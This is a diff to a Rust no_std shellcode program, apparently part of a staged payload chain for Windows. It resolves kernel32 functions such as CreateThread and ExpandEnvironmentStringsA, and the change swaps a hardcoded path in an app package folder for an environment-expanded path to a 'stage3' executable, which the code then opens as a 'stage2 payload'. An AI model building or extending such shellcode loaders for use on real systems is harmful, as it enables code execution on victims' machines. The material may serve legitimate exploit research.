@@ -5,9 +5,8 @@
 #![no_std]
 #![no_main]
 
-extern crate compiler_builtins;
-
 use core::arch::asm;
+use core::mem::MaybeUninit;
 use core::panic::PanicInfo;
 
 use shellcode_utils::prelude::*;
@@ -16,6 +15,8 @@ use shellcode_utils::prelude::*;
 fn panic(_info: &PanicInfo) -> ! {
     loop {}
 }
+
+const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\test_program.exe"#, "\0");
 
 #[no_mangle]
 pub extern "C" fn main() -> u32 {
@@ -50,6 +51,7 @@ pub extern "C" fn main() -> u32 {
     let CreateThread = fetch_create_thread(kernel32_ptr);
     let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernel32_ptr);
     let GetModuleHandleA = fetch_get_module_handle(kernel32_ptr);
+    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernel32_ptr);
 
     // let wsprintfa_ptr = get_func_by_name(u32_dll, wsprintfa_.as_ptr());
     // if wsprintfa_ptr.is_null() {
@@ -59,10 +61,14 @@ pub extern "C" fn main() -> u32 {
     // }
     // let wsprintfa: wsprintfaFn = unsafe { core::mem::transmute(wsprintfa_ptr) };
 
-    let stage2_filename = concat!(
-        r#"C:\Users\lander\AppData\Local\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\run.exe"#,
-        "\0"
-    );
+    let mut stage2_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
+    unsafe {
+        (ExpandEnvironmentStringsA)(
+            STAGE3_ENV_FILENAME.as_ptr(),
+            stage2_filename.as_mut_ptr() as *mut _,
+            core::mem::size_of_val(&stage2_filename) as u32,
+        );
+    }
 
     // Open the stage2 payload
     let handle = unsafe {
